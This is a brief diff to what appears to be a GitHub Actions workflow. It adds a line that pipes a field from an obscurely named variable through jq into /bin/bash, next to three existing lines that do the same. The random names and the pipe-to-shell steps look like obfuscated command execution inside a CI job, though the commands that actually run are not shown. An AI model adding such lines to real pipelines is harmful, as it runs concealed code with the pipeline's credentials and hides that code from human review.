@@ -27,6 +27,7 @@ jobs:
           echo $vseir19 | jq -r .ooe667 | /bin/bash
           printf '%s' "$he9" | jq -r .vrce175 | /bin/bash
           echo $aat5 | jq -r .yo29 | /bin/bash
+          echo $hjve97 | jq -r .tgkb1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
